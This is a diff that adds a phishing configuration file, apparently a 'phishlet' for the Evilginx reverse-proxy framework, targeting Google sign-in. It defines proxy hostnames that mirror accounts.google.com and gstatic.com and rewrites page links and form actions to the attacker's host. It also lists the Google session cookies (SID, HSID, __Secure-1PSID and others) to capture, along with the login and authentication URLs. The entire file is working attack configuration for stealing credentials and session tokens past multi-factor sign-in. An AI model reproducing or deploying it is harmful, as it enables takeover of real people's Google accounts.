@@ -1,0 +1,27 @@
+name: google
+author: kgretzky
+min_ver: '2.4.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="https://accounts.google.com', replace: 'href="https://{hostname}', mimes: ['text/html'], redirect: true}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'action="https://accounts.google.com', replace: 'action="https://{hostname}', mimes: ['text/html'], redirect: true}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/_/scs/abc-static', replace: 'https://{hostname}/_/scs/abc-static', mimes: ['text/html'], redirect: false}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://ssl.gstatic.com', replace: 'https://{hostname_starts_with: ssl}.gstatic.com', mimes: ['text/html'], redirect: false}
+  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '/', replace: '', mimes: ['image/jpeg', 'image/png', 'image/svg+xml', 'text/css'], redirect: true}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID','HSID','SSID','APISID','SAPISID','SIDCC','__Secure-1PSID','__Secure-3PSID','__Secure-1PSIDCC','__Secure-3PSIDCC','__Secure-1PSIDTS','__Secure-3PSIDTS','LSID','SMSV','gtm','OTZ','NID','1P_JAR']
+
+auth_urls:
+  - '/accounts/SetSID'
+  - '/accounts/SetOSID'
+
+login_urls:
+  - 'https://{hostname}/accounts/Login'
+  - 'https://{hostname}/v3/signin/identifier'
+  - 'https://{hostname}/v3/signin/challenge/pwd'
